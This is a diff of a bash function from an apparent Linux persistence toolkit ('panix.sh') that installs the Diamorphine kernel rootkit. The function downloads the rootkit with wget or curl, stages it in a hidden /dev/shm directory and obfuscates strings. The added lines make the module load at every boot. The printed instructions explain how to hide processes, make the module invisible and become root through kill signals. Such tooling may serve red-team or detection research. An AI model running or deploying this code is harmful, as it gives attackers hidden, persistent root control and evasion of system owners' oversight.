@@ -1,23 +1,23 @@
 setup_rootkit() {
-    # References:
-    # Diamorphine Rootkit: https://github.com/m0nad/Diamorphine
-    # Inspiration: https://github.com/MatheuZSecurity/D3m0n1z3dShell/blob/main/scripts/implant_rootkit.sh
-    # Inspiration: https://github.com/Trevohack/DynastyPersist/blob/main/src/dynasty.sh#L194
+	# References:
+	# Diamorphine Rootkit: https://github.com/m0nad/Diamorphine
+	# Inspiration: https://github.com/MatheuZSecurity/D3m0n1z3dShell/blob/main/scripts/implant_rootkit.sh
+	# Inspiration: https://github.com/Trevohack/DynastyPersist/blob/main/src/dynasty.sh#L194
 
-    local rk_path="/dev/shm/.rk"
-    local tmp_path="/tmp"
-    local zip_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.zip"
-    local tar_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.tar"
-    local clone_url="https://github.com/Aegrah/Diamorphine.git"
-    local secret=""
-    local identifier=""
+	local rk_path="/dev/shm/.rk"
+	local tmp_path="/tmp"
+	local zip_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.zip"
+	local tar_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.tar"
+	local clone_url="https://github.com/Aegrah/Diamorphine.git"
+	local secret=""
+	local identifier=""
 
 	if ! check_root; then
 		echo "Error: This function can only be run as root."
 		exit 1
 	fi
 
-    usage_rootkit() {
+	usage_rootkit() {
 		echo "Usage: ./panix.sh --rootkit"
 		echo "--examples                 Display command examples"
 		echo "--secret <secret>          Specify the secret"
@@ -82,57 +82,57 @@ setup_rootkit() {
 		exit 1
 	fi
 
-    echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04."
-    echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7."
-    echo "[!] I cannot guarantee that it will work on other distributions."
-    sleep 5
+	echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04."
+	echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7."
+	echo "[!] I cannot guarantee that it will work on other distributions."
+	sleep 5
 
-    mkdir -p $rk_path
+	mkdir -p $rk_path
 
-    # Check if wget or curl is installed
-    if command -v wget >/dev/null 2>&1; then
-        downloader="wget"
-    elif command -v curl >/dev/null 2>&1; then
-        downloader="curl"
-    else
-        echo "Error: Neither 'wget' nor 'curl' is installed. Please install one of them to proceed."
-        exit 1
-    fi
+	# Check if wget or curl is installed
+	if command -v wget >/dev/null 2>&1; then
+		downloader="wget"
+	elif command -v curl >/dev/null 2>&1; then
+		downloader="curl"
+	else
+		echo "Error: Neither 'wget' nor 'curl' is installed. Please install one of them to proceed."
+		exit 1
+	fi
 
-    # Function to download files using the available downloader
-    download_file() {
-        local url="$1"
-        local output="$2"
-        if [ "$downloader" = "wget" ]; then
-            wget -O "$output" "$url"
-        else
-            curl -L -o "$output" "$url"
-        fi
-    }
+	# Function to download files using the available downloader
+	download_file() {
+		local url="$1"
+		local output="$2"
+		if [ "$downloader" = "wget" ]; then
+			wget -O "$output" "$url"
+		else
+			curl -L -o "$output" "$url"
+		fi
+	}
 
-    # Check for zip/unzip
-    if command -v zip >/dev/null 2>&1 && command -v unzip >/dev/null 2>&1; then
-        echo "zip/unzip is available. Downloading diamorphine.zip..."
-        download_file "${zip_url}" "${tmp_path}/diamorphine.zip"
-        unzip "${tmp_path}/diamorphine.zip" -d "${tmp_path}/diamorphine"
+	# Check for zip/unzip
+	if command -v zip >/dev/null 2>&1 && command -v unzip >/dev/null 2>&1; then
+		echo "zip/unzip is available. Downloading diamorphine.zip..."
+		download_file "${zip_url}" "${tmp_path}/diamorphine.zip"
+		unzip "${tmp_path}/diamorphine.zip" -d "${tmp_path}/diamorphine"
 		mv ${tmp_path}/diamorphine/Diamorphine-master/* "${rk_path}/"
 
-    # Check for tar
-    elif command -v tar >/dev/null 2>&1; then
-        echo "tar is available. Downloading diamorphine.tar..."
-        download_file "${tar_url}" "${tmp_path}/diamorphine.tar"
-        tar -xf "${tmp_path}/diamorphine.tar" -C "${rk_path}/" --strip-components=1
+	# Check for tar
+	elif command -v tar >/dev/null 2>&1; then
+		echo "tar is available. Downloading diamorphine.tar..."
+		download_file "${tar_url}" "${tmp_path}/diamorphine.tar"
+		tar -xf "${tmp_path}/diamorphine.tar" -C "${rk_path}/" --strip-components=1
 
-    # Check for git
-    elif command -v git >/dev/null 2>&1; then
-        echo "git is available. Cloning diamorphine.git..."
-        git clone "${clone_url}" "${tmp_path}/diamorphine"
+	# Check for git
+	elif command -v git >/dev/null 2>&1; then
+		echo "git is available. Cloning diamorphine.git..."
+		git clone "${clone_url}" "${tmp_path}/diamorphine"
 		mv ${tmp_path}/diamorphine/* "${rk_path}/"
-    # If none are available
-    else
-        echo "Error: None of unzip, tar, or git is installed. Please install one of them to proceed, or download Diamorphine manually."
-        exit 1
-    fi
+	# If none are available
+	else
+		echo "Error: None of unzip, tar, or git is installed. Please install one of them to proceed, or download Diamorphine manually."
+		exit 1
+	fi
 
 	# Obfuscate most obvious strings
 	# Files
@@ -186,15 +186,32 @@ setup_rootkit() {
 	fi
 
 	make -C ${rk_path} clean
-    touch ${rk_path}/restore_${identifier}.ko
+	touch ${rk_path}/restore_${identifier}.ko
+
+	# Add kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/
+	echo "[+] Adding kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d..."
+
+	if [ -d "/etc/modules-load.d" ]; then
+		echo "${identifier}" > /etc/modules-load.d/${identifier}.conf
+	fi
+
+	if [ -d "/usr/lib/modules-load.d" ]; then
+		echo "${identifier}" > /usr/lib/modules-load.d/${identifier}.conf
+	fi
+
+	if [ -f "/etc/modules" ]; then
+		if ! grep -q "^${identifier}$" /etc/modules; then
+			echo "${identifier}" >> /etc/modules
+		fi
+	fi
 
 	echo "[+] Diamorphine rootkit has been installed."
-    echo "[+] The secret is: ${secret}"
-    echo "[+] The identifier is: ${identifier}"
+	echo "[+] The secret is: ${secret}"
+	echo "[+] The identifier is: ${identifier}"
 
-    echo "[+] kill -31 pid: hide/unhide any process;"
-    echo "[+] kill -63 pid: turns the module (in)visible;"
-    echo "[+] kill -64 pid: become root;"
-    echo "[+] Any file starting with ${secret} is hidden."
-    echo "[+] Source: https://github.com/m0nad/Diamorphine"
+	echo "[+] kill -31 pid: hide/unhide any process;"
+	echo "[+] kill -63 pid: turns the module (in)visible;"
+	echo "[+] kill -64 pid: become root;"
+	echo "[+] Any file starting with ${secret} is hidden."
+	echo "[+] Source: https://github.com/m0nad/Diamorphine"
 }
